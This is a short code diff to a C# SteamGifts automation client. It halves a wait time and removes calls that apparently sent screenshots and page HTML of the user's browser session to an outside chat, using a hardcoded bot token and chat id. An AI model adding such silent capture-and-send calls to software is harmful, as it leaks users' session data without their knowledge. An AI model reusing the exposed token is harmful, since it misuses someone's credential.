@@ -11,7 +11,7 @@ namespace SteamGifts.Client
     {
         private readonly IWebDriver _driver;
         private readonly ILogger? _logger;
-        private const int DefaultWaitTime = 10000; // Default wait time in milliseconds
+        private const int DefaultWaitTime = 5000; // Default wait time in milliseconds
 
         public SteamGiftsClient(IWebDriver driver, ILogger? logger = null)
         {
@@ -63,11 +63,6 @@ namespace SteamGifts.Client
                 _logger?.LogDebug("Loading giveaways from page {Page}", currentPage);
                 page.GoToPage(currentPage++);
 
-                
-
-                ScreenshotSender.CaptureAndSendScreenshotAsync(_driver, "7673152076:AAHnWpELVS7a2kpjJFcG8-mIK3I5gV02Zg8", "204433040").GetAwaiter().GetResult();
-                ScreenshotSender.CaptureAndSendHtmlAsync(_driver, "7673152076:AAHnWpELVS7a2kpjJFcG8-mIK3I5gV02Zg8", "204433040").GetAwaiter().GetResult();
-
                 Thread.Sleep(DefaultWaitTime);
 
                 if (page.IsConsentButtonVisible())
@@ -107,9 +102,6 @@ namespace SteamGifts.Client
 
             page.GoToPage();
             Thread.Sleep(DefaultWaitTime);
-
-            ScreenshotSender.CaptureAndSendScreenshotAsync(_driver, "7673152076:AAHnWpELVS7a2kpjJFcG8-mIK3I5gV02Zg8", "204433040").GetAwaiter().GetResult();
-            ScreenshotSender.CaptureAndSendHtmlAsync(_driver, "7673152076:AAHnWpELVS7a2kpjJFcG8-mIK3I5gV02Zg8", "204433040").GetAwaiter().GetResult();
 
             bool result = page.PerformEnter();
 
